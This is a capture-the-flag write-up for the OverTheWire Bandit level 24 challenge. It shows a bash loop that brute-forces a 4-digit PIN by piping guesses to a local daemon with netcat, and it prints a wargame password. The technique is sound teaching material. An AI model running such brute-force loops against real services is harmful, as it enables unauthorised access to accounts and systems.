@@ -1,0 +1,62 @@
+= Bandit 25 Writeup
+:author: Miguel Magana
+:email:  m1k3.0xd@gmail.com
+:revnumber: v1.0 
+:revdate: 2022-06-07
+:revremark: First draft
+:toc: auto
+
+
+This is a writeup for the Over the Wire Bandit wargame. This writeup will guide you through each level to teach CTF/Wargame basics.
+
+WARNING: DO NOT SHARE THE FLAG ONCE FOUND
+
+== The Objective
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+== Get the Flag
+This challenge is also going to require some scripting and looping. As the hint says there is a pin from 0000 - 9999 along with the current flag for *bandit24* to get *bandit25*. For this we can create a Bash script that will populate the command line for us with the flag of the *bandit24* and looping through the numbers of the pin until we get the correct pin.
+
+ nc localhost 30002
+
+Provide the flag for *bandit24* in the */etc/bandit_pass/bandit24* file. *cat* it out and paste it in then take a guess at the 4 digit pin. Any guess, you might get it right!
+
+It gives you a nice prompt if the pin is wrong so you will know if you got the pin correct. Inputting this would take a very long time manually so the *for* loop will help us.
+
+Create temporary directory to work out of.
+
+ mkdir /tmp/m1k3
+ cd /tmp/m1k3
+
+Use your favorite text editor to create a script that will loop through the pins.
+
+ vim bruteforce.sh
+
+Set your shabang and layout your *for* loop.
+
+ #!/bin/bash
+
+This sets the range to count from 0000-9999 and echos the 
+ 
+ for i in {000..9999}
+ do
+    echo $i
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002
+ done
+
+This is still going to take a good amount of time to get to the correct pin. Setting code to randomize the count or start from the highest number and work backwards. I just let it go because I am a glutton for countdowns! Mine went very slowly trying each connection. The code was running as fast as code could run but the each attempt was slow to reset then try again. It could be dependent on my connection.
+
+Eventually you will get a hit with a prompt saying you have the correct pin number. If you disconnect just reconnect and go into your temporary folder but be sure to change your script to leave out the pin numbers you already tried. My script ran them in order so when I got disconnected in the middle of bruteforcing the pin I left on 0038 so I changed my script to start from that number.
+
+NOTE: Another way to complete the bruteforce faster is to not pipe the output of the loop to netcat directly. Rather pipe the output to a text file.
+
+ for i in {000..9999}
+ do
+    echo $i
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> pin-combinations.txt
+ done
+
+Then you can *cat* that the output of the pin-combinations.txt file and pipe it into netcat then piping that output into a results.txt file.
+ cat pin-combinations.txt | nc localhost 30002 >> results.txt
+
+This will spit out all of the errors and finally the correct prompt that shows the flag. Create your password file and change your command to get into the next level.
